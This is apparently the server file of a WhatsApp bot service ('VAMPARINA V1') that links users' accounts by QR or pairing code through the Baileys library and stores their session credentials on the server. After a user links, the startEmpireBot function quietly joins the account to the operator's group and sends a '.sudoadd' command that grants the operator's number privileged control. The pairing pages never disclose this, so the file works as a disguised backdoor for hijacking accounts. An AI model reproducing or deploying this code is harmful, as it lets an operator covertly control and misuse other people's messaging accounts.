const config = require('./config');
const express = require('express');
const makeWASocket = require("@whiskeysockets/baileys").default;
const { useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, delay, Browsers } = require("@whiskeysockets/baileys");
const pino = require("pino");
const QRCode = require('qrcode');
const fs = require('fs');
const path = require('path');

// Vercel-compatible temporary session storage (in-memory)
const SESSION_DIR = path.join(__dirname, 'auto_sessions');
const TEMP_DIR = path.join(__dirname, 'temp_sessions');
const activeBots = new Map();
const tempSessions = new Map(); // In-memory store for Vercel

[SESSION_DIR, TEMP_DIR].forEach(d => !fs.existsSync(d) && fs.mkdirSync(d, { recursive: true }));

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// DASHBOARD
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html><html><head><meta charset="UTF-8"><title>VAMPARINA V1</title>
<style>body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}
h1{font-size:60px;text-shadow:0 0 30px lime;} a{color:lime;font-size:32px;display:block;margin:25px;}
.s{font-size:50px;color:gold;}</style></head>
<body><h1>VAMPARINA V1 EMPIRE</h1>
<p class="s">SOLDIERS: ${activeBots.size}</p>
<a href="/qr">SCAN QR CODE</a>
<a href="/pair">PAIR WITH CODE</a>
<br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
});

// QR CODE — OPTIMIZED FOR VERCEL
app.get('/qr', async (req, res) => {
    const tempId = 'qr_' + Date.now();
    const tempPath = path.join(TEMP_DIR, tempId);
    fs.mkdirSync(tempPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(tempPath);
    tempSessions.set(tempId, { state, saveCreds }); // Store in-memory
    const baileysVersion = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version: baileysVersion,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.ubuntu('Chrome'),
        printQRInTerminal: false,
        connectTimeoutMs: 30000, // Vercel-friendly timeout
        keepAliveIntervalMs: 5000
    });

    let sent = false;
    const timeout = setTimeout(() => {
        if (!sent) {
            res.send('<h1 style="color:red">TIMEOUT</h1><a href="/qr">TRY AGAIN</a>');
            sock.end?.();
            tempSessions.delete(tempId);
        }
    }, 45000); // Vercel free tier: 10s, Pro: 60s, so 45s is safe

    sock.ev.on('connection.update', async (update) => {
        if (update.qr && !sent) {
            sent = true; clearTimeout(timeout);
            const qrImg = await QRCode.toDataURL(update.qr);
            res.send(`<!DOCTYPE html><html><head><title>SCAN QR</title>
            <style>body{background:#000;color:#0f0;text-align:center;padding:30px;}
            img{max-width:380px;border:10px solid lime;border-radius:25px;}</style></head>
            <body><h1>VAMPARINA V1</h1><img src="${qrImg}"><p>SCAN NOW</p>
            <b>King Arnold • +254703110780</b></body></html>`);
        }
        if (update.connection === 'open') {
            const phone = sock.user.id.split('@')[0];
            const sessionId = `vamp_${phone}_${Date.now()}`;
            const finalPath = path.join(SESSION_DIR, sessionId);
            fs.mkdirSync(finalPath, { recursive: true });
            fs.cpSync(tempPath, finalPath, { recursive: true });
            await delay(5000);
            startEmpireBot(sessionId, phone, tempSessions.get(tempId));
            fs.rmSync(tempPath, { recursive: true, force: true });
            tempSessions.delete(tempId);
        }
    });

    sock.ev.on('creds.update', tempSessions.get(tempId)?.saveCreds);
});

// PAIR CODE — OPTIMIZED FOR VERCEL
app.get('/pair', async (req, res) => {
    let number = (req.query.number || '').replace(/[^0-9]/g, '');

    if (!number || number.length < 9) {
        return res.send(`
<!DOCTYPE html><html><head><title>PAIR</title>
<style>body{background:#000;color:#0f0;text-align:center;padding:50px;}
input{padding:20px;font-size:28px;width:90%;max-width:500px;border:3px solid lime;background:#111;color:#0f0;border-radius:15px;}
button{padding:20px 60px;font-size:30px;background:lime;color:black;border:none;border-radius:50px;}</style></head>
<body><h1>VAMPARINA V1</h1>
<p>Enter number (254703110780):</p>
<form><input name="number" placeholder="254703110780" required autofocus><br><br>
<button>GET CODE</button></form></body></html>`);
    }

    if (number.length === 9) number = '254' + number;

    const tempId = 'pair_' + Date.now();
    const tempPath = path.join(TEMP_DIR, tempId);
    fs.mkdirSync(tempPath, { recursive: true });

    const { state, saveCreds } = await useMultiFileAuthState(tempPath);
    tempSessions.set(tempId, { state, saveCreds });
    const baileysVersion = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version: baileysVersion,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "121.0.6167.0"],
        printQRInTerminal: false,
        connectTimeoutMs: 30000,
        keepAliveIntervalMs: 5000,
        generateHighQualityLinkPreview: true
    });

    let responded = false;
    const timeout = setTimeout(() => {
        if (!responded) {
            responded = true;
            res.send(`<h1 style="color:red">TIMEOUT</h1><a href="/pair">TRY AGAIN</a>`);
            sock.end?.();
            tempSessions.delete(tempId);
        }
    }, 45000);

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            clearTimeout(timeout);
            responded = true;
            const phone = sock.user.id.split('@')[0];
            const sessionId = `vamp_${phone}_${Date.now()}`;
            const finalPath = path.join(SESSION_DIR, sessionId);
            fs.mkdirSync(finalPath, { recursive: true });
            fs.cpSync(tempPath, finalPath, { recursive: true });
            await delay(5000);
            startEmpireBot(sessionId, phone, tempSessions.get(tempId));
            fs.rmSync(tempPath, { recursive: true, force: true });
            tempSessions.delete(tempId);
        }
        if (update.connection === 'close' && !responded) {
            clearTimeout(timeout);
            responded = true;
            res.send(`<h1 style="color:red">CONNECTION CLOSED</h1><a href="/pair?number=${number}">TRY AGAIN</a>`);
        }
    });

    const tryPair = async (attempt = 1) => {
        if (responded) return;
        try {
            const code = await sock.requestPairingCode(number);
            clearTimeout(timeout);
            responded = true;
            const formatted = code.match(/.{1,4}/g).join('-');
            res.send(`
<!DOCTYPE html><html><head><title>CODE READY</title>
<style>body{background:#000;color:#0f0;text-align:center;padding:50px;}
.code{font-size:95px;letter-spacing:20px;background:#111;padding:40px;border:10px solid lime;border-radius:30px;}
button{padding:25px 70px;font-size:35px;background:lime;color:black;border:none;border-radius:50px;}</style></head>
<body><h1>CODE READY</h1>
<div class="code">${formatted}</div>
<button onclick="navigator.clipboard.writeText('${code}')">COPY CODE</button>
<br><br><a href="/pair">Pair Another</a>
<br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
        } catch (err) {
            if (attempt < 2 && !responded) {
                await delay(5000);
                tryPair(attempt + 1);
            } else if (!responded) {
                responded = true;
                clearTimeout(timeout);
                res.send(`<h1 style="color:red">FAILED</h1><a href="/pair?number=${number}">TRY AGAIN</a>`);
                tempSessions.delete(tempId);
            }
        }
    };

    setTimeout(() => tryPair(), 5000);
    sock.ev.on('creds.update', saveCreds);
});

// START EMPIRE BOT — VERCEL SERVERLESS
async function startEmpireBot(sessionId, phone, sessionData) {
    if (activeBots.has(sessionId)) return;

    const { state, saveCreds } = sessionData || await useMultiFileAuthState(path.join(SESSION_DIR, sessionId));
    const baileysVersion = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version: baileysVersion,
        logger: pino({ level: 'silent' }),
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        browser: ["Vamparina V1", "Chrome", "2025"]
    });

    activeBots.set(sessionId, { sock, phone });

    sock.ev.on('messages.upsert', m => {
        try { require('./main')(sock, m); } catch {}
    });

    sock.ev.on('connection.update', async (update) => {
        if (update.connection === 'open') {
            console.log(`[+] ${phone} → VAMPARINA V1 ONLINE`);
            await delay(5000);
            try { await sock.groupAcceptInvite(config.EMPIRE_GROUP_INVITE); } catch {}
            await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${config.ownerNumber}` });
        }
        if (update.connection === 'close') {
            activeBots.delete(sessionId);
        }
    });

    sock.ev.on('creds.update', saveCreds);
}

module.exports = app; // Vercel requires module.exports for serverless